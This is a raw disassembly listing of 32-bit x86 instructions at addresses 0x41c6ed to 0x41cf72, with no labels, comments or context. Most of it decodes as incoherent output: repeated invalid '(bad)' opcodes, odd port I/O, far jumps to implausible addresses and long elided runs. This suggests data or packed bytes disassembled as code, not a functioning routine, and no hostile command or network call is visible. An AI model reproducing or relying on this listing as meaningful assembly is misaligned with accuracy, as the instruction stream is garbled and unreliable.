  41c6ed:	xchg   esp,eax
  41c6ee:	or     cl,ch
  41c6f0:	(bad)  
  41c6f1:	xchg   esp,eax
  41c6f2:	or     cl,ch
  41c6f4:	(bad)  
  41c6f5:	xchg   esp,eax
  41c6f6:	or     cl,ch
  41c6f8:	(bad)  
  41c6f9:	xchg   esp,eax
  41c6fa:	or     cl,ch
  41c6fc:	(bad)  
  41c6fd:	xchg   esp,eax
  41c6fe:	or     cl,ch
  41c700:	(bad)  
  41c701:	xchg   esp,eax
  41c702:	or     cl,ch
  41c704:	(bad)  
  41c705:	xchg   esp,eax
  41c706:	or     cl,ch
  41c708:	(bad)  
  41c709:	xchg   esp,eax
  41c70a:	or     cl,ch
  41c70c:	(bad)  
  41c70d:	xchg   esp,eax
  41c70e:	or     cl,ch
  41c710:	(bad)  
  41c711:	xchg   esp,eax
  41c712:	or     cl,ch
  41c714:	(bad)  
  41c715:	xchg   esp,eax
  41c716:	or     cl,ch
  41c718:	(bad)  
  41c719:	xchg   esp,eax
  41c71a:	or     cl,ch
  41c71c:	(bad)  
  41c71d:	xchg   esp,eax
  41c71e:	or     cl,ch
  41c720:	(bad)  
  41c721:	xchg   esp,eax
  41c722:	or     cl,ch
  41c724:	(bad)  
  41c725:	xchg   esp,eax
  41c726:	or     BYTE PTR [eax],al
  41c728:	jne    0x41c6bd
  41c72a:	or     BYTE PTR [eax],al
  41c72c:	gs xchg ebx,eax
  41c72e:	or     BYTE PTR [eax],al
  41c730:	gs xchg ebx,eax
  41c732:	or     BYTE PTR [eax],al
  41c734:	xor    eax,0x35000893
  41c739:	xchg   ebx,eax
  41c73a:	or     BYTE PTR [eax],al
	...
  41c750:	and    eax,0x25000893
  41c755:	xchg   ebx,eax
  41c756:	or     BYTE PTR [eax],al
  41c758:	xor    eax,0x35000893
  41c75d:	xchg   ebx,eax
  41c75e:	or     BYTE PTR [eax],al
  41c760:	and    eax,0x25000893
  41c765:	xchg   ebx,eax
  41c766:	or     BYTE PTR [eax],al
  41c768:	cmc    
  41c769:	xchg   edx,eax
  41c76a:	or     BYTE PTR [eax],al
  41c76c:	cmc    
  41c76d:	xchg   edx,eax
  41c76e:	or     BYTE PTR [eax],al
  41c770:	in     eax,0x92
  41c772:	or     BYTE PTR [eax],al
  41c774:	in     eax,0x92
  41c776:	or     BYTE PTR [eax],al
  41c778:	cmc    
  41c779:	xchg   edx,eax
  41c77a:	or     BYTE PTR [eax],al
  41c77c:	cmc    
  41c77d:	xchg   edx,eax
  41c77e:	or     BYTE PTR [eax],al
  41c780:	in     eax,0x92
  41c782:	or     BYTE PTR [eax],al
  41c784:	in     eax,0x92
  41c786:	or     BYTE PTR [eax],al
  41c788:	mov    ch,0x92
  41c78a:	or     BYTE PTR [eax],al
  41c78c:	mov    ch,0x92
  41c78e:	or     BYTE PTR [eax],al
  41c790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c791:	xchg   edx,eax
  41c792:	or     BYTE PTR [eax],al
  41c794:	pop    ecx
  41c795:	or     esp,esp
  41c797:	push   ecx
  41c798:	pop    ss
  41c799:	push   ecx
  41c79a:	add    BYTE PTR [edx-0xbcf36c],cl
  41c7a0:	pop    es
  41c7a1:	mov    cl,0x52
  41c7a3:	ret    
  41c7a4:	cmp    DWORD PTR [ebx],ecx
  41c7a6:	in     al,0x51
  41c7a8:	loop   0x41c7e7
  41c7aa:	cmp    ecx,ecx
  41c7ac:	call   0x7723eba
  41c7b1:	pop    ds
  41c7b2:	add    al,0x8b
	...
  41c7c8:	cli    
  41c7c9:	js     0x41c74c
  41c7cb:	inc    esi
  41c7cc:	xchg   esp,eax
  41c7cd:	or     ecx,DWORD PTR [ebx-0x4]
  41c7d0:	pop    ss
  41c7d1:	pop    ss
  41c7d2:	sub    BYTE PTR [ebx+0x6b3514a2],cl
  41c7d8:	fmul   DWORD PTR [ebp+0x20d73f88]
  41c7de:	or     ch,bl
  41c7e0:	xor    eax,0x318b5636
  41c7e5:	cmp    cl,cl
  41c7e7:	int3   
  41c7e8:	(bad)  [ecx]
  41c7ea:	in     al,0x83
  41c7ec:	cmp    BYTE PTR [ecx-0x7f],dh
  41c7ef:	inc    ebp
  41c7f0:	xchg   esp,eax
  41c7f1:	or     ecx,DWORD PTR [ebx-0x20]
  41c7f4:	pop    es
  41c7f5:	dec    eax
  41c7f6:	call   0x8f68186
  41c7fb:	push   ecx
  41c7fc:	enter  0x5b0b,0xe4
  41c800:	pop    ss
  41c801:	push   eax
  41c802:	in     al,dx
  41c803:	mov    eax,DWORD PTR [esp+ebx*1+0x9]
  41c807:	dec    ebp
  41c808:	test   BYTE PTR [ebx],cl
  41c80a:	inc    ebx
  41c80b:	clc    
  41c80c:	pop    ss
  41c80d:	inc    eax
  41c80e:	lock mov ecx,DWORD PTR [esi+0x70]
  41c812:	or     DWORD PTR [ebp-0x7c],eax
  41c815:	or     ecx,DWORD PTR [ebx-0x18]
  41c818:	pop    es
  41c819:	dec    eax
  41c81a:	lock mov ebx,DWORD PTR [ebp+0x74]
  41c81e:	or     DWORD PTR [ebp-0x6c],edx
  41c821:	or     ebx,DWORD PTR [ebx-0x10]
  41c824:	pop    es
  41c825:	push   eax
  41c826:	lock mov eax,DWORD PTR [eax+edi*2+0x9]
  41c82b:	dec    ebp
	...
  41c840:	xchg   esp,eax
  41c841:	or     eax,DWORD PTR [ebx-0x4]
  41c844:	retf   
  41c845:	dec    edi
  41c846:	cld    
  41c847:	add    BYTE PTR [esp+edx*4+0x985eb08],cl
  41c84e:	pop    ebx
  41c84f:	hlt    
  41c850:	psrld  mm0,QWORD PTR [esi]
  41c853:	mov    ecx,ebx
  41c855:	mov    al,ds:0x9744580
  41c85a:	inc    ebx
  41c85b:	hlt    
  41c85c:	mov    bh,0x4c
  41c85e:	adc    BYTE PTR [ebx-0x2c],dh
  41c861:	or     DWORD PTR [ebx-0x10],ebx
  41c864:	pop    ss
  41c865:	xchg   edx,eax
  41c866:	or     DWORD PTR [ebp-0x7c],eax
  41c869:	or     ecx,DWORD PTR [ebx-0x24]
  41c86c:	out    0x86,al
  41c86e:	pusha  
  41c86f:	lods   al,BYTE PTR ds:[esi]
  41c870:	mov    ss,WORD PTR [eax+ecx*1-0x75]
  41c874:	sar    DWORD PTR [eax-0x6c2317aa],1
  41c87a:	or     BYTE PTR [eax],al
  41c87c:	(bad)  
  41c87e:	add    eax,DWORD PTR [ebp-0x74eee0b4]
  41c884:	mov    ecx,0x244580a0
  41c889:	test   DWORD PTR [ebp+0x430bbc0c],edi
  41c88f:	in     al,dx
  41c890:	pop    ss
  41c891:	aas    
  41c892:	in     al,0x8b
  41c894:	dec    ecx
  41c895:	cwde   
  41c896:	add    BYTE PTR [esp+ebx*1],0x91
  41c89a:	dec    ebx
  41c89b:	or     bh,ah
  41c89d:	xchg   BYTE PTR [ecx-0x38ef23b3],al
  41c8a3:	add    al,0x0
	...
  41c8b5:	add    BYTE PTR [eax],al
  41c8b7:	add    BYTE PTR ds:0x30ebf847,dl
  41c8bd:	popa   
  41c8be:	enter  0xe98b,0x36
  41c8c2:	leave  
  41c8c3:	int3   
  41c8c4:	fadd   st,st(7)
  41c8c6:	ret    
  41c8c7:	int3   
  41c8c8:	rol    bh,1
  41c8ca:	ret    
  41c8cb:	int3   
  41c8cc:	enter  0xc3c7,0xcc
  41c8d0:	pop    ecx
  41c8d1:	or     esp,esp
  41c8d3:	cmp    DWORD PTR [eax-0x5cfa1f85],0xffffff94
  41c8da:	hlt    
  41c8db:	mov    DWORD PTR [ecx-0x54],edx
  41c8de:	add    BYTE PTR [ebp-0x5c],0x43
  41c8e2:	loopne 0x41c90d
  41c8e4:	mov    edx,DWORD PTR [esp+esi*8-0x5866b77d]
  41c8eb:	hlt    
  41c8ec:	add    dl,dh
  41c8ee:	or     BYTE PTR [eax+0x30],ch
  41c8f1:	xchg   edi,eax
  41c8f2:	dec    eax
  41c8f3:	add    BYTE PTR [edi],dl
  41c8f5:	loop   0x41c8d7
  41c8f7:	push   ecx
  41c8f8:	arpl   WORD PTR [edx-0x6b328904],bp
  41c8fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8ff:	clc    
  41c900:	fcmovbe st,st(5)
  41c902:	or     BYTE PTR [edx-0x74],ch
  41c905:	dec    BYTE PTR [eax]
  41c907:	push   0x489750
  41c90c:	cmp    ebp,DWORD PTR [edx-0x6b328910]
  41c912:	add    DWORD PTR [ebp+0x34],0x8cfc4e5c
  41c919:	xchg   esp,eax
  41c91a:	or     BYTE PTR [eax],al
	...
  41c930:	daa    
  41c931:	sahf   
  41c932:	jg     0x41c989
  41c934:	adc    BYTE PTR [eax],bl
  41c936:	mov    DWORD PTR [ecx],0x83f4ea15
  41c93c:	adc    DWORD PTR [eax+0x1fad7301],0xa107fc4e
  41c946:	lea    ecx,[esi+ecx*4+0x175108d4]
  41c94d:	jmp    0x76fc:0xa9db52e0
  41c954:	dec    ebp
  41c955:	xchg   esp,eax
  41c956:	jg     0x41c9a5
  41c958:	enter  0xd1d,0x8d
  41c95c:	mov    eax,0xa7004a0a
  41c961:	fs and ch,0x51
  41c965:	push   edi
  41c966:	(bad)
  41c969:	pusha  
  41c96a:	(bad)
  41c96d:	pusha  
  41c96e:	(bad)
  41c971:	pusha  
  41c972:	(bad)
  41c975:	pop    ds
  41c976:	in     eax,0xa1
  41c978:	fmul   DWORD PTR [ebx]
  41c97a:	dec    edx
  41c97b:	add    dl,al
  41c97d:	pop    ds
  41c97e:	dec    ecx
  41c97f:	xor    BYTE PTR [edi],al
  41c981:	loope  0x41c983
  41c983:	ds add eax,0x4f5d00dc
  41c989:	pusha  
  41c98a:	(bad)
  41c98d:	pusha  
  41c98e:	(bad)
  41c991:	pusha  
  41c992:	(bad)
	...
  41c9a5:	add    BYTE PTR [eax],al
  41c9a7:	add    BYTE PTR [ecx-0x2e741ae1],bh
  41c9ad:	mov    al,ds:0x9cd18b58
  41c9b2:	pop    ecx
  41c9b3:	jmp    DWORD PTR [ecx-0x73be8478]
  41c9b9:	icebp  
  41c9ba:	(bad)  
  41c9bb:	int3   
  41c9bc:	pop    eax
  41c9bd:	pusha  
  41c9be:	(bad)
  41c9c1:	pusha  
  41c9c2:	(bad)
  41c9c5:	pusha  
  41c9c6:	(bad)
  41c9c9:	pop    ds
  41c9ca:	in     eax,0x83
  41c9cc:	clc    
  41c9cd:	fwait
  41c9ce:	pop    esi
  41c9cf:	add    BYTE PTR [esi-0x6c],dh
  41c9d2:	pusha  
  41c9d3:	fmul   QWORD PTR [esi-0x6600f72c]
  41c9d9:	mov    WORD PTR [ebx+0x41],?
  41c9dc:	mov    WORD PTR ds:0x7c74f84e,ds
  41c9e2:	pop    es
  41c9e3:	inc    eax
  41c9e4:	mov    WORD PTR [edi],ds
  41c9e6:	dec    esi
  41c9e7:	clc    
  41c9e8:	cmp    al,0x7c
  41c9ea:	scas   eax,DWORD PTR es:[edi]
  41c9eb:	dec    ebx
  41c9ed:	xchg   edx,eax
  41c9ee:	mov    ah,al
  41c9f0:	xchg   esp,eax
  41c9f1:	sbb    eax,0xe107fc4e
  41c9f6:	sbb    BYTE PTR [ecx+0x7],dl
  41c9f9:	jmp    0xd9591c02
  41c9fe:	add    BYTE PTR [eax-0x5d],dl
  41ca01:	call   0xf0f355fa
  41ca06:	(bad)  
  41ca07:	int3   
  41ca08:	cmp    DWORD PTR [edi],ebx
  41ca0a:	in     eax,0x51
	...
  41ca20:	push   ebx
  41ca21:	fdiv   st,st(4)
  41ca23:	add    BYTE PTR [esp+edx*4+0x1d85eb08],cl
  41ca2a:	dec    esi
  41ca2b:	cld    
  41ca2c:	andnps xmm1,XMMWORD PTR [edx]
  41ca2f:	mov    ecx,edx
  41ca31:	nop
  41ca32:	or     BYTE PTR [ebp+0x60],0xce
  41ca36:	inc    ebp
  41ca37:	adc    bh,bl
  41ca39:	mov    cl,0x7f
  41ca3b:	push   ebp
  41ca3c:	test   BYTE PTR [ebp+0x4a9bfc5d],dl
  41ca42:	pop    es
  41ca43:	mov    edx,ecx
  41ca45:	mov    al,ds:0xa2384d07
  41ca4a:	mov    edx,0x7d567711
  41ca4f:	pop    es
  41ca50:	in     al,0x93
  41ca52:	or     BYTE PTR [eax],al
  41ca54:	mov    WORD PTR [ebp+0xd],?
  41ca57:	jmp    0x41ca95
  41ca59:	(bad)  
  41ca5a:	enter  0x298b,0xf0
  41ca5e:	(bad)  
  41ca5f:	int3   
  41ca60:	fsub   DWORD PTR [eax-0x3b]
  41ca63:	int3   
  41ca64:	shl    BYTE PTR [eax-0x3b],1
  41ca67:	int3   
  41ca68:	enter  0xc560,0xcc
  41ca6c:	pop    ecx
  41ca6d:	sbb    eax,0x9484b9e5
  41ca72:	or     BYTE PTR [eax],al
  41ca74:	push   0x8989021d
  41ca79:	loopne 0x41caf6
  41ca7b:	inc    ecx
  41ca7c:	mov    edi,gs
  41ca7e:	(bad)  
  41ca7f:	int3   
  41ca80:	fsub   DWORD PTR [eax-0x3b]
  41ca83:	int3   
	...
  41ca98:	shl    BYTE PTR [eax-0x3b],1
  41ca9b:	int3   
  41ca9c:	enter  0xc560,0xcc
  41caa0:	pop    ecx
  41caa1:	sbb    eax,0xa4b883e5
  41caa6:	jg     0x41caed
  41caa8:	xchg   esp,eax
  41caa9:	adc    eax,0xa18c0471
  41caae:	mov    WORD PTR [eax-0x74f76b74],cs
  41cab4:	fstp   DWORD PTR [edi+edi*2-0x20ea77af]
  41cabb:	or     BYTE PTR [ebp+0x7e],bl
  41cabe:	adc    BYTE PTR [ebp+0x78],0x1d
  41cac2:	dec    esi
  41cac3:	or     BYTE PTR [edi],cl
  41cac5:	push   esp
  41cac6:	add    DWORD PTR [ecx+0x45cc84c9],ecx
  41cacc:	pop    eax
  41cacd:	xchg   esp,eax
  41cace:	or     BYTE PTR [eax],al
  41cad0:	mov    WORD PTR [ebp+0x2],?
  41cad3:	mov    ebx,ecx
  41cad5:	nop
  41cad6:	mov    cl,al
  41cad8:	lea    ebx,[ebx]
  41cada:	inc    esi
  41cadb:	cld    
  41cadc:	pop    es
  41cadd:	out    0xf4,eax
  41cadf:	cmp    ebx,ecx
  41cae1:	mov    BYTE PTR [eax+0x46],bh
  41cae4:	pop    ss
  41cae5:	xlat   BYTE PTR ds:[ebx]
  41cae6:	hlt    
  41cae7:	mov    edx,ecx
  41cae9:	test   BYTE PTR [edi+esi*4],al
  41caec:	adc    bl,0xc9
  41caef:	cli    
  41caf0:	adc    BYTE PTR ds:0xc68103ef,0x7f
  41caf7:	inc    ebp
  41caf8:	add    BYTE PTR ds:0xf046,bl
	...
  41cb0e:	add    BYTE PTR [eax],al
  41cb10:	mov    ecx,DWORD PTR [ecx+0x1d]
  41cb13:	inc    ecx
  41cb14:	or     eax,0x8c0ff476
  41cb19:	xchg   esp,eax
  41cb1a:	adc    DWORD PTR [ebp-0x1c],0x7084e1c
  41cb21:	fild   WORD PTR [ebx+eax*1]
  41cb24:	test   BYTE PTR ds:0x9817f85e,bl
  41cb2a:	sbb    DWORD PTR [ebx],eax
  41cb2c:	dec    ecx
  41cb2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb2e:	jg     0x41cb7d
  41cb30:	test   BYTE PTR ds:0xa38f0c5e,bl
  41cb36:	jg     0x41cb85
  41cb38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb39:	sbb    cl,BYTE PTR ds:0x803ab70a
  41cb3f:	push   ebp
  41cb40:	test   BYTE PTR ds:0xd68f084e,bl
  41cb46:	or     al,0x89
  41cb48:	rcr    DWORD PTR [ecx+eiz*8-0xb6f7c95],1
  41cb4f:	mov    esi,DWORD PTR [ecx-0xe]
  41cb52:	(bad)  
  41cb53:	int3   
  41cb54:	fstp   DWORD PTR [ebx]
  41cb56:	in     eax,0x83
  41cb58:	js     0x41cb13
  41cb5a:	jg     0x41cba1
  41cb5c:	xchg   esp,eax
  41cb5d:	sbb    eax,0xe207e44e
  41cb62:	in     al,dx
  41cb63:	mov    edi,DWORD PTR [ecx-0x77aef788]
  41cb69:	sbb    eax,0xda17e85e
  41cb6e:	loopne 0x41cafb
  41cb70:	add    al,0x15
  41cb72:	or     DWORD PTR [eax],eax
	...
  41cb88:	mov    WORD PTR ds:0x120ff046,ds
  41cb8e:	stc    
  41cb8f:	add    BYTE PTR [ebx-0x73ff0fe8],dl
  41cb95:	xchg   esp,eax
  41cb96:	jg     0x41cbed
  41cb98:	test   BYTE PTR [ebx-0x15ea0fa3],dl
  41cb9e:	call   0x88b6152e
  41cba3:	js     0x41cb41
  41cba5:	xchg   esp,eax
  41cba6:	add    eax,DWORD PTR [ecx+ebp*8+0x76000894]
  41cbad:	xchg   esp,eax
  41cbae:	pop    esi
  41cbaf:	add    BYTE PTR [edi],dl
  41cbb1:	loop   0x41cb9b
  41cbb3:	mov    eax,DWORD PTR [ecx-0x64]
  41cbb6:	pop    es
  41cbb7:	push   ecx
  41cbb8:	and    dl,0xf3
  41cbbb:	adc    eax,0x4a06c4
  41cbc0:	adc    eax,0x518bf4da
  41cbc5:	je     0x41cb4f
  41cbc7:	cmp    BYTE PTR [eax+ecx*1+0x74598b12],cl
  41cbce:	adc    BYTE PTR [ebp-0x6c],0x93
  41cbd2:	sbb    DWORD PTR [ecx+0x45808841],ecx
  41cbd8:	lods   al,BYTE PTR ds:[esi]
  41cbd9:	sbb    eax,DWORD PTR [esi+0x8]
  41cbdc:	(bad)  
  41cbdd:	fcomp  QWORD PTR [eax]
  41cbdf:	mov    ecx,edx
  41cbe1:	and    al,0x17
  41cbe4:	pop    es
  41cbe5:	jmp    0x9d0b57d2
  41cbea:	pop    es
  41cbeb:	inc    edx
	...
  41cc00:	jl     0x41cc1f
  41cc02:	dec    esi
  41cc03:	hlt    
  41cc04:	pop    ss
  41cc05:	loope  0x41cbef
  41cc07:	mov    eax,ecx
  41cc09:	pushf  
  41cc0a:	pop    es
  41cc0b:	adc    DWORD PTR ds:0xd1c7e4e9,eax
  41cc11:	mov    WORD PTR [ecx],cs
  41cc13:	add    BYTE PTR [esp+edx*4+0x132c457f],cl
  41cc1a:	jno    0x41cc2c
  41cc1c:	mov    WORD PTR [eax],cs
  41cc1e:	add    al,0x8b
  41cc20:	fnstenv [eax+ecx*4+0x39]
  41cc24:	mov    WORD PTR [eax],cs
  41cc26:	or     al,0xc7
  41cc28:	ror    DWORD PTR [edx+ecx*1+0x7f948c00],1
  41cc2f:	push   ebp
  41cc30:	add    BYTE PTR [ebx],dl
  41cc32:	das    
  41cc33:	add    BYTE PTR [eax-0xb],bh
  41cc36:	jg     0x41cc7d
  41cc38:	add    BYTE PTR [ebx],bl
  41cc3a:	add    DWORD PTR [ecx+0x893ed],eax
  41cc40:	or     al,0x8
  41cc42:	adc    eax,0x8088398b
  41cc47:	add    dh,BYTE PTR [ecx+0x53fff48f]
  41cc4d:	in     al,0x7f
  41cc4f:	dec    ebp
  41cc50:	enter  0xe0e4,0xb5
  41cc54:	ror    DWORD PTR [esi-0x642f7c0c],0x81
  41cc5b:	inc    ebp
  41cc5c:	sar    BYTE PTR [edx+0x15],1
  41cc5f:	mov    eax,DWORD PTR [ecx-0x78]
  41cc62:	add    BYTE PTR [edx],0x0
	...
  41cc75:	add    BYTE PTR [eax],al
  41cc77:	add    BYTE PTR [edi],dl
  41cc79:	loope  0x41cc7b
  41cc7b:	lea    eax,[eax-0x64]
  41cc7e:	push   es
  41cc7f:	push   edx
  41cc80:	pop    es
  41cc81:	fxtract 
  41cc83:	push   eax
  41cc84:	je     0x41ccac
  41cc86:	idiv   bh
  41cc88:	adc    DWORD PTR [edx],0xffffffcd
  41cc8b:	or     BYTE PTR ds:0xc18bd4d8,al
  41cc91:	add    BYTE PTR [eax+0x1a1c4855],0x8b
  41cc98:	leave  
  41cc99:	mov    BYTE PTR [eax+0x4e1b90c0],cl
  41cc9f:	hlt    
  41cca0:	pop    es
  41cca1:	loopne 0x41cc87
  41cca3:	or     DWORD PTR [ebp-0x67],0xffffff81
  41cca7:	dec    ebp
  41cca8:	xor    BYTE PTR [edx-0x64],bh
  41ccab:	mov    esp,ecx
  41ccad:	je     0x41cc37
  41ccaf:	ret    0x1b98
  41ccb2:	pop    esi
  41ccb3:	loopne 0x41ccea
  41ccb5:	lahf   
  41ccb6:	repz jmp DWORD PTR [ebx]
  41ccb9:	sbb    ch,dh
  41ccbb:	pop    ebp
  41ccbc:	dec    edi
  41ccbd:	popa   
  41ccbe:	(bad)
  41ccc1:	sbb    ebp,esp
  41ccc3:	cmp    eax,0xffffff9c
  41ccc6:	pusha  
  41ccc7:	lock mov ss,esp
  41ccca:	or     bh,bh
  41cccc:	mov    eax,ds:0x8c417b94
  41ccd1:	sbb    ecx,DWORD PTR [esi-0x8]
  41ccd4:	je     0x41cc66
  41ccd6:	pop    es
  41ccd7:	inc    eax
  41ccd8:	mov    WORD PTR [ecx],ds
  41ccda:	dec    esi
  41ccdb:	clc    
	...
  41ccf0:	cmp    al,0x7c
  41ccf2:	xor    edi,ebp
  41ccf4:	ror    DWORD PTR [ebp+0x1b94c488],cl
  41ccfa:	dec    esi
  41ccfb:	cld    
  41ccfc:	pop    ss
  41ccfd:	loopne 0x41cd17
  41ccff:	push   ecx
  41cd00:	pop    es
  41cd01:	call   0xd8491f0a
  41cd06:	add    BYTE PTR [eax-0x55],dl
  41cd09:	out    0xf4,eax
  41cd0b:	mov    ebp,DWORD PTR [ecx-0x37333811]
  41cd11:	pusha  
  41cd12:	(bad)
  41cd15:	sbb    ebp,esp
  41cd17:	mov    eax,ds:0x4a05e4
  41cd1c:	dec    edx
  41cd1d:	xchg   esp,eax
  41cd1e:	pusha  
  41cd1f:	mov    esp,DWORD PTR [ecx-0x73be841c]
  41cd25:	sbb    ebx,DWORD PTR [ecx+0x1]
  41cd28:	push   ds
  41cd29:	push   ecx
  41cd2a:	adc    DWORD PTR [eax-0x77],0x48ccc7ef
  41cd31:	pusha  
  41cd32:	(bad)
  41cd35:	sbb    ebp,esp
  41cd37:	cmp    DWORD PTR [eax],0xffffffa0
  41cd3a:	test   eax,0x8d3bb4c
  41cd3f:	mov    ebx,DWORD PTR [esi-0x3f]
  41cd42:	sar    DWORD PTR [esi],0x7
  41cd45:	aam    0x38
  41cd47:	mov    edi,DWORD PTR [esi]
  41cd49:	sbb    edi,edx
  41cd4b:	ds pop ss
  41cd4d:	fadd   QWORD PTR [ebx+ecx*4]
  41cd50:	sbb    eax,DWORD PTR ds:[esi-0xc]
	...
  41cd68:	pop    es
  41cd69:	xlat   BYTE PTR ds:[ebx]
  41cd6a:	cld    
  41cd6b:	mov    edx,DWORD PTR [eax+eiz*4-0x7f]
  41cd6f:	dec    ebp
  41cd70:	add    al,0x19
  41cd72:	pop    esi
  41cd73:	clc    
  41cd74:	add    eax,0x8db8f4e7
  41cd79:	xchg   esp,eax
  41cd7a:	or     BYTE PTR [eax],al
  41cd7c:	adc    DWORD PTR [ebp+edi*2+0x44],edx
  41cd80:	(bad)  
  41cd81:	psllw  mm0,QWORD PTR [eax]
  41cd84:	popa   
  41cd85:	cwde   
  41cd86:	aaa    
  41cd87:	shl    bh,0xcf
  41cd8a:	jg     0x41cdd9
  41cd8c:	les    ebx,FWORD PTR [eax]
  41cd8e:	pop    edx
  41cd8f:	sbb    BYTE PTR [edi-0x6a8aff19],al
  41cd95:	sbb    DWORD PTR [esi-0x8],ecx
  41cd98:	pop    es
  41cd99:	fild   WORD PTR [ecx+ecx*4]
  41cd9c:	push   esp
  41cd9d:	mov    al,0x7f
  41cd9f:	push   ebp
  41cda0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cda1:	sbb    BYTE PTR [esi+0x10],cl
  41cda4:	add    eax,0x8db810d2
  41cda9:	xchg   esp,eax
  41cdaa:	or     BYTE PTR [eax],al
  41cdac:	ja     0x41cd5b
  41cdae:	jg     0x41cdfd
  41cdb0:	test   BYTE PTR [eax],ah
  41cdb2:	sbb    cl,BYTE PTR [ecx+0x45808ce1]
  41cdb8:	je     0x41cd8a
  41cdba:	dec    ebp
  41cdbb:	cld    
  41cdbc:	loope  0x41cd4e
  41cdbe:	aaa    
  41cdbf:	shl    BYTE PTR [edi-0x6f],0xdf
  41cdc3:	mov    bl,0x9f
  41cdc5:	push   esp
  41cdc6:	and    ch,0xb1
  41cdc9:	push   edi
  41cdca:	(bad)
	...
  41cddd:	add    BYTE PTR [eax],al
  41cddf:	add    BYTE PTR [eax+0x59],bl
  41cde2:	(bad)
  41cde5:	pop    ecx
  41cde6:	(bad)
  41cde9:	pop    ecx
  41cdea:	(bad)
  41cded:	pop    ds
  41cdee:	in     eax,0x8b
  41cdf0:	rcr    DWORD PTR [edi+ebp*1+0xc079045],1
  41cdf7:	mov    edx,ecx
  41cdf9:	pushf  
  41cdfa:	fild   WORD PTR ds:0x457f9827
  41ce00:	cwde   
  41ce01:	jmp    0x59129acd
  41ce06:	(bad)
  41ce09:	pop    eax
  41ce0a:	vmulps ymm3,ymm6,YMMWORD PTR [edi]
  41ce0e:	in     eax,0x83
  41ce10:	clc    
  41ce11:	mov    eax,0x94e045cb
  41ce16:	cwde   
  41ce17:	add    DWORD PTR [edi+ebx*1-0x2dfaf7b2],ecx
  41ce1e:	ror    BYTE PTR [ebx+0x55806c59],1
  41ce24:	xchg   esp,eax
  41ce25:	xchg   edi,eax
  41ce26:	pop    ecx
  41ce27:	cmp    al,0x5
  41ce29:	loop   0x41ce13
  41ce2b:	mov    ecx,DWORD PTR [ecx+0x74]
  41ce2e:	add    al,0xb7
  41ce30:	push   esp
  41ce31:	mov    al,ds:0x19ac557f
  41ce36:	dec    ebp
  41ce37:	or     dh,BYTE PTR [ebp+ebx*1+0x4e]
  41ce3b:	call   0x40495e64
  41ce40:	mov    WORD PTR [edi],ds
  41ce42:	push   es
  41ce43:	cmp    BYTE PTR [eax],al
	...
  41ce55:	add    BYTE PTR [eax],al
  41ce57:	add    bl,bh
  41ce59:	aad    0x8
  41ce5b:	push   ecx
  41ce5c:	fs fwait
  41ce5e:	hlt    
  41ce5f:	push   DWORD PTR [ebx+0x17]
  41ce62:	int    0x8
  41ce64:	adc    eax,0xcc6af8d1
  41ce69:	cld    
  41ce6a:	or     BYTE PTR [eax],dh
  41ce6c:	mov    WORD PTR [eax+eiz*2+0x894fc00],ss
  41ce73:	push   0xffffff8c
  41ce75:	mov    ebx,DWORD PTR [esi-0x10]
  41ce78:	adc    eax,0xe18becd1
  41ce7d:	je     0x41cdff
  41ce7f:	inc    edx
  41ce80:	fsub   st,st(4)
  41ce82:	jg     0x41ced1
  41ce84:	xchg   esp,eax
  41ce85:	in     eax,0x7f
  41ce87:	push   ebp
  41ce88:	sub    dh,ah
  41ce8a:	loopne 0x41ce0d
  41ce8c:	sbb    cl,BYTE PTR [ebx-0x67b77c0c]
  41ce92:	retf   
  41ce93:	inc    ebp
  41ce94:	add    BYTE PTR [eax+ecx*1+0x27f8c00],dl
  41ce9b:	mov    edx,DWORD PTR [ecx-0x80]
  41ce9e:	mov    al,al
  41cea0:	lea    ebx,ds:0xd917f44e
  41cea6:	call   0xb26e9ba
  41ceab:	cmp    DWORD PTR [ecx-0x80],eax
  41ceae:	js     0x41cf09
  41ceb0:	pop    es
  41ceb1:	shl    eax,1
  41ceb3:	add    DWORD PTR [eax+eiz*4+0x8],0x74
  41ceb8:	dec    ecx
  41ceb9:	pop    ds
  41ceba:	inc    esi
  41cebb:	call   0x41cec0
	...
  41ced0:	prefetch BYTE PTR [ecx]
  41ced3:	add    BYTE PTR [eax],bh
  41ced5:	enter  0x557f,0xb4
  41ced9:	push   ds
  41ceda:	inc    edi
  41cedb:	adc    BYTE PTR [edi],dl
  41cedd:	fld1   
  41cedf:	mov    edi,DWORD PTR ds:0x7c4485c8
  41cee5:	mov    eax,DWORD PTR [eax-0x293993b3]
  41ceeb:	idiv   ebp
  41ceed:	enter  0x557f,0x6c
  41cef1:	call   0x457f:0xe4b042a3
  41cef8:	je     0x41cf18
  41cefa:	inc    esi
  41cefb:	or     BYTE PTR [edi+0x7511cdc],cl
  41cf01:	loopne 0x41cee3
  41cf03:	mov    ecx,ecx
  41cf05:	jo     0x41cf0f
  41cf07:	inc    edx
  41cf08:	cwde   
  41cf09:	in     al,0xe0
  41cf0b:	adc    eax,0x83f48a42
  41cf10:	push   eax
  41cf11:	cdq    
  41cf12:	jg     0x41cf61
  41cf14:	and    al,0x16
  41cf16:	retf   0x1528
  41cf19:	fsub   st,st(0)
  41cf1b:	jmp    0x41cf1b
  41cf1d:	sbb    eax,0x7cbee45e
  41cf22:	ret    
  41cf23:	cld    
  41cf24:	adc    ecx,DWORD PTR [edx-0x36f3b78]
  41cf2a:	sbb    al,0x3
  41cf2c:	dec    esp
  41cf2d:	xchg   esp,eax
  41cf2e:	test   eax,0x8d38338
  41cf33:	push   eax
	...
  41cf48:	in     al,0xdd
  41cf4a:	out    dx,eax
  41cf4b:	(bad)  
  41cf4c:	jmp    0x41cf63
  41cf4e:	int    0x8
  41cf50:	adc    eax,0x9983d4d0
  41cf55:	sar    BYTE PTR [ebx+0x41],0x8c
  41cf59:	xchg   esp,eax
  41cf5a:	jge    0x41cf66
  41cf5c:	pop    ss
  41cf5d:	cwde   
  41cf5e:	and    al,0x77
  41cf60:	dec    ebp
  41cf61:	xchg   esp,eax
  41cf62:	pop    ecx
  41cf63:	jmp    DWORD PTR [ecx+0x68]
  41cf66:	mov    BYTE PTR ds:0x4a0178,bh
  41cf6c:	mov    edi,?
  41cf6e:	adc    al,0x6a
  41cf70:	dec    esp
  41cf71:	cld    
  41cf72:	or     BYTE PTR [eax],dh
